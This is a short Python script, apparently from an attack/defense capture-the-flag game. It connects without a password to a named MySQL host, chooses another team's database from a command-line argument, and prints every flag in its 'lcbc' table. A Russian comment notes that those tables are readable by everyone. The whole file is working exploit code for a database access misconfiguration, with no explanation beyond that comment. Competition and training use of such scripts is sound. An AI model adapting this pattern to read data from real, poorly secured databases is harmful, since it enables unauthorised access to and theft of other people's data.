#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Таблицы lcbc в БД каждой команды доступны на чтение всем
import pymysql.cursors
import sys

DB = "kappabonus.spbctf.com"

cnx = pymysql.connect(user='kappa', host=DB,
                        database='test{i}'.format(i=sys.argv[1][4]))
cursor = cnx.cursor()
query = "SELECT flag FROM lcbc"
cursor.execute(query)

for row in cursor:
    print(row[0], flush=True)

cursor.close()
cnx.close()
